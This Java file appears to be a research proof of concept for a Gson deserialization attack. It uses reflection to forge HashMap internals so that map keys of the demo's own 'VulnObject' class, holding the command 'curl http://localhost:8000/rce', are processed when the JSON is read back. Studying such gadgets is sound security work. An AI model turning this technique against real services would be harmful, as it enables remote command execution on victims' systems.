package top.anemone.gsondemo.PoC;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

@SuppressWarnings("Duplicates")
public class Main {

    public static void main(String[] args) throws Exception {
        HashMap o = getPoC("curl http://localhost:8000/rce");
        VulnContainer myContainer=new VulnContainer();
        myContainer.setvulnObjectHashMap(o);

        Gson gson1 = new GsonBuilder().enableComplexMapKeySerialization().create();
        String json=gson1.toJson(myContainer);
        System.out.println(json);

        Gson gson2 = new GsonBuilder().enableComplexMapKeySerialization().create();
        VulnContainer myContainer2=gson2.fromJson(json, VulnContainer.class);
        System.out.println(myContainer2);
    }


    static HashMap getPoC(String cmd) throws Exception {
        VulnObject object1=new VulnObject();
        object1.setCmd(cmd);

        VulnObject object2=new VulnObject();
        object2.setCmd(cmd);
        String value="foo";
        HashMap ret = makeMap(object1, object2, value);
        return ret;
    }

    public static<T,S> HashMap<T,S> makeMap(T k1, T k2, S v) throws Exception {
        HashMap<T, S> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, k1, v, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, k2, v, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static class Reflections {

        public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                if (field != null)
                    field.setAccessible(true);
                else if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);

                return field;
            } catch (NoSuchFieldException e) {
                if (!clazz.getSuperclass().equals(Object.class)) {
                    return getField(clazz.getSuperclass(), fieldName);
                }
                throw e;
            }
        }


        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }

    }
}
